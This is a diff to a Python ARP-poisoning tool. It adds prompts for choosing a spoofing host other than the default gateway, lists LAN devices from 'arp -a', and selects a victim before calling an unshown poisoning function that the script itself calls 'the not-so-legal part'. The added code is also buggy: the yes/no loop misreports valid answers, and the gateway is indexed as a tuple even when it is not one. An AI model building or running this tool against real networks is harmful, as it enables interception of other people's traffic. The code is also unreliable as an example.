@@ -31,12 +31,26 @@ def main():
     print("Scanning network for potential targets...")
     #grab the gateway(router)
     gateway = get_default_gateway()
-    print("gateway: ", gateway)
+    print("gateway: ", gateway, "Use as host?")
+    quit = False
+    use_default_gateway = True
+    while quit == False:
+        response = input("[Y/N]: ")
+        if(response in ["y", "Y", "Yes", "yes"]):
+            print("Proceeding with host: ", gateway)
+            quit = True
+        if(response in ["n", "N", "No", "no"]):
+            print("Allright, choose your host from the following targets: ")
+            use_default_gateway = False
+            quit = True
+        else:
+            print("Unrecognized response, read this please!!!")
+
 
     #grab the other devices
     devices = []
     for device in os.popen('arp -a'): 
-        if(extract_ip_address(device) != gateway):
+        if(extract_ip_address(device) != gateway or not(use_default_gateway)):
             #we do not need the gateway
             devices.append(device)
         else:
@@ -44,17 +58,30 @@ def main():
     for i in range(len(devices)):
         print("[", i, "]: ", devices[i])
     
+    #optional host selection
+    if(not(use_default_gateway)):
+        response = -1
+        while response not in range(0, len(devices)):
+            response = int(input("select host on index [number]: "))
+            if(response not in range(0, len(devices))):
+                print("Invalid host you dumb-dumb!")
+        gateway = devices[response]
+        gateway = (extract_ip_address(gateway), extract_mac_address(gateway))
+        print("Host ", gateway[0], " at ", gateway[1], " selected.")
+
     #target selection
-    print("What follows is the not-so-legal part, continue at own risk!")
     response = -1
     while response not in range(0, len(devices)):
         response = int(input("select target on index [number]: "))
         if(response not in range(0, len(devices))):
             print("Invalid target you dumb-dumb!")
+        elif (extract_ip_address(devices[response]) == gateway[0]):
+            print("Cannot select the same target as the gateway!")
     target = devices[response]
     target = (extract_ip_address(target), extract_mac_address(target))
-    print("Target ", target[0], " at ", target[1], " selected, proceeding with ARP poisoning using gateway ", gateway[0], " at ", gateway[1])
+    print("Target ", target[0], " at ", target[1], " selected, proceeding with ARP poisoning using host ", gateway[0], " at ", gateway[1])
 
+    print("What follows is the not-so-legal part, continue at own risk!")
     function_that_do_the_thing(target[0], gateway[0])
     #actual poisoning here
 
